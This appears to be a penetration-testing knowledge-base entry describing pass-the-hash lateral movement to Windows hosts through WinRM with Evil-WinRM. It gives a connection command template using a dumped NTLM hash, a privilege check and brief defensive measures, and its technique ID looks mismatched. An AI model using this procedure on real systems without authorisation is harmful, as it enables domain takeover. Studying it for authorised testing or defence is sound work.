---
id: 5e2d35cd-13cf-40f0-aedd-06ef55cf693f
name: access-winrm-with-pass-the-hash
type: procedure
verified: true
submitted: true
created_at: '2020-03-16T02:05:05.244733+00:00'
updated_at: '2023-05-25T19:44:35.252518+00:00'
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[T1075.001]]'
  - '[[Windows Remote Management]]'
sub_techniques: []
tags:
  - network
  - pass-the-hash
  - shell
commands:
  - '[[commands/evil-winrm-connect-with-ntlm]]'
tools:
  - '[[tools/Evil-WinRM]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: critical
detection_risk: high
validated: true
---

# access-winrm-with-pass-the-hash

## Summary

Authenticate to WinRM using an NTLM hash instead of password for lateral movement to high-privilege targets like the Domain Controller.

## Description

Pass-the-Hash via evil-winrm uses the dumped NTLM hash for NTLMSSP authentication, bypassing password knowledge while gaining shell access.

## Requirements

- NTLM hash
- WinRM open
- Evil-WinRM ([[tools/Evil-WinRM]])

## Defense

- Disable NTLM, enforce Kerberos
- Monitor logon type 9 (new credentials)
- Restrict WinRM

## Objectives

1. Use hash for auth
2. Gain admin shell
3. Achieve domain control

## Instructions

### Step 1: Prepare Hash

**Context**: Extract from secretsdump output.

Format as aad3b435b51404eeaad3b435b51404ee:ntlm_hash.

### Step 2: Connect with Hash

**Context**: Specify -H for hash.

**Command** ([[commands/evil-winrm-connect-with-ntlm]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

> Authenticates via PtH.

### Step 3: Verify Privilege

**Context**: Confirm admin context.

In shell: `whoami /priv`.

> SeDebugPrivilege etc. for admin.

## Expected Output

Shell prompt as Administrator.
